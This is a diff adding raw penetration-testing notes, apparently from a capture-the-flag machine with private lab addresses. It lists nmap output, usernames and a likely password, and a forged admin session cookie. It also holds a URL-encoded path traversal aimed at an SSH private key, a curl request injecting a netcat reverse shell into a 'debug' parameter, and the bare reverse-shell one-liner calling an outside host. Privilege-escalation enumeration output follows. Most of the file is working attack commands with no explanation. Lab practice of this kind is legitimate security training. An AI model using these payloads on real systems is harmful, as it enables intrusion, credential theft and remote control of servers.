@@ -1,0 +1,60 @@
+<!--- Any bugs? Please report them to our developer team. We have an open bug bounty program!
+  For any inquiries, contact devops@securesolacoders.no.
+  Sincerely, anders (Senior Developer) -->
+
+
+8080/tcp open  http-proxy syn-ack Werkzeug/2.2.2 Python/3.8.10                                                                                    
+|_http-server-header: Werkzeug/2.2.2 Python/3.8.10      
+
+
+devops@securesolacoders.no
+anders@securesolacoders.no
+anders
+devops
+
+securesolacoders2022
+
+
+{
+  "logged_in": true,
+  "username": "anders",
+  "admin": true
+}
+
+anders:x:1000:1000:anders:/home/anders:/bin/bash
+devops:x:1001:1001:,,,:/home/devops:/bin/bash
+
+/usr/bin/python3/home/devops/app.py
+
+/%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e/home/anders/.ssh/id_rsa
+
+
+
+
+
+curl 'http://10.10.244.247:8080/admin' -X POST -H 'Cookie: session=eyJsb2dnZWRfaW4iOnRydWUsInVzZXJuYW1lIjoiYWRtaW4ifQ.Z8-P8A.2MwnsaMYBwtf6IlPc5te8_S5y4g' --data-raw 'debug=rm -f /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>%261|nc 10.8.34.3 4445 >/tmp/f'
+
+
+rm -f /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>%261|nc 10.8.34.3 4545 >/tmp/f
+
+
+systemd+     570  0.0  0.7  27260  7612 ?        Ss   01:08   0:00 /lib/systemd/systemd-networkd
+  └─(Caps) 0x0000000000003c00=cap_net_bind_service,cap_net_broadcast,cap_net_admin,cap_net_raw
+
+root         590  0.0  0.2   6816  2832 ?        Ss   01:08   0:00 /usr/sbin/cron -f                                                                                                          
+root         607  0.0  0.3   8480  3380 ?        S    01:08   0:00  _ /usr/sbin/CRON -f       
+
+/etc/apache2/sites-enabled
+You have write privileges over /lib/systemd/system/ssh.service
+/lib/systemd/system/vsftpd.service
+/etc/apache2/envvars
+
+╔══════════╣ Unexpected in /opt (usually empty)
+total 12
+drwxr-xr-x  3 root root 4096 Oct 16  2022 .
+drwxr-xr-x 19 root root 4096 Oct 16  2022 ..
+drwxr-xr-x  2 root root 4096 Oct 16  2022 news
+
+drwxr-xr-x 2 root root 4096 Nov  8  2022 /var/backups
+total 56
+
